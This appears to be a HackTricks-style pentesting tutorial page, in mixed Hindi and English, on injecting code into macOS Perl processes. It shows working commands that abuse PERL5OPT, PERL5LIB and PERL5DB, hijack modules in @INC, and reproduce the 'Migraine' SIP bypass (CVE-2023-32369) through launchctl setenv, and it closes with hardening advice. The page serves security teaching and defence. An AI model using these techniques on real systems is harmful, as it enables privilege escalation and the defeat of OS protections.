# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

`PERL5OPT` env variable का उपयोग करके **Perl** को interpreter शुरू होने पर arbitrary commands execute करने के लिए बाध्य किया जा सकता है (यहाँ तक कि target script की पहली line parse होने से **पहले** भी)।
उदाहरण के लिए, यह script बनाएँ:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
अब **env variable को export करें** और **perl** script को execute करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक अन्य विकल्प Perl module (जैसे `/tmp/pmod.pm`) बनाना है:
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
और फिर env variables का उपयोग करें ताकि module स्वतः locate और load हो जाए:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Other interesting environment variables

* **`PERL5DB`** – जब interpreter को **`-d`** (debugger) flag के साथ शुरू किया जाता है, तो `PERL5DB` की content को debugger context *के अंदर* Perl code के रूप में execute किया जाता है।
यदि आप किसी privileged Perl process के environment **और** command-line flags, दोनों को influence कर सकते हैं, तो आप ऐसा कुछ कर सकते हैं:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – Windows पर यह variable नियंत्रित करता है कि Perl को shell spawn करने की आवश्यकता होने पर कौन-सा shell executable उपयोग करना है। इसे यहां केवल completeness के लिए बताया गया है, क्योंकि यह macOS पर relevant नहीं है।

हालांकि `PERL5DB` के लिए `-d` switch आवश्यक है, maintenance या installer scripts मिलना common है जिन्हें *root* के रूप में इस flag के साथ verbose troubleshooting के लिए execute किया जाता है, जिससे यह variable एक valid escalation vector बन जाता है।

## Via dependencies (@INC abuse)

Perl जिस include path (**`@INC`**) को search करेगा, उसे इस तरह list करना possible है:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14 पर सामान्य output इस प्रकार दिखाई देता है:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ लौटाए गए folders मौजूद भी नहीं हैं, हालांकि **`/Library/Perl/5.30`** मौजूद है, SIP द्वारा *protected* नहीं है और SIP-protected folders से *पहले* है। इसलिए, यदि आप *root* के रूप में लिख सकते हैं, तो आप एक malicious module (जैसे `File/Basename.pm`) रख सकते हैं, जिसे उस module को import करने वाली कोई भी privileged script *preferentially* load करेगी।

> [!WARNING]
> `/Library/Perl` के अंदर लिखने के लिए आपको अभी भी **root** की आवश्यकता है और macOS write operation करने वाली process के लिए *Full Disk Access* मांगने वाला **TCC** prompt दिखाएगा।

उदाहरण के लिए, यदि कोई script **`use File::Basename;`** import कर रही है, तो attacker-controlled code वाली `/Library/Perl/5.30/File/Basename.pm` बनाना संभव होगा।

## Migration Assistant के माध्यम से SIP bypass (CVE-2023-32369 “Migraine”)

मई 2023 में Microsoft ने **CVE-2023-32369**, जिसका nick-name **Migraine** है, disclose किया। यह एक post-exploitation technique है, जो *root* attacker को System Integrity Protection (SIP) को पूरी तरह **bypass** करने देती है।
Vulnerable component **`systemmigrationd`** है, जिसे **`com.apple.rootless.install.heritable`** entitlement प्राप्त है। इस daemon द्वारा spawn की गई कोई भी child process इस entitlement को inherit करती है और इसलिए SIP restrictions के *बाहर* चलती है।<sup>[[1]](#references)</sup>

Researchers द्वारा पहचाने गए children में Apple-signed interpreter भी शामिल है:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
क्योंकि Perl `PERL5OPT` का सम्मान करता है (और Bash `BASH_ENV` का), इसलिए daemon के *environment* को poison करना ही SIP-less context में arbitrary execution हासिल करने के लिए पर्याप्त है:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
जब `migrateLocalKDC` चलता है, तो `/usr/bin/perl` malicious `PERL5OPT` के साथ शुरू होता है और *SIP के दोबारा सक्षम होने से पहले* `/private/tmp/migraine.sh` को execute करता है। उस script से, उदाहरण के लिए, आप किसी payload को **`/System/Library/LaunchDaemons`** के अंदर कॉपी कर सकते हैं या किसी file को **undeletable** बनाने के लिए `com.apple.rootless` extended attribute असाइन कर सकते हैं।

Apple ने macOS **Ventura 13.4**, **Monterey 12.6.6** और **Big Sur 11.7.7** में इस issue को fix कर दिया, लेकिन पुराने या un-patched systems अभी भी exploitable हैं।<sup>[[1]](#references)</sup>

## Hardening recommendations

1. **खतरनाक variables clear करें** – privileged launchdaemons या cron jobs को pristine environment से शुरू होना चाहिए (`launchctl unsetenv PERL5OPT`, `env -i`, आदि)।
2. **Interpreters को root के रूप में चलाने से बचें**, जब तक यह strictly necessary न हो। Compiled binaries का उपयोग करें या privileges को जल्दी drop करें।
3. **Vendor scripts को `-T` (taint mode) के साथ चलाएँ**, ताकि taint checking enabled होने पर Perl `PERL5OPT` और अन्य unsafe switches को ignore करे।
4. **macOS को up to date रखें** – current releases में “Migraine” पूरी तरह patched है।

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
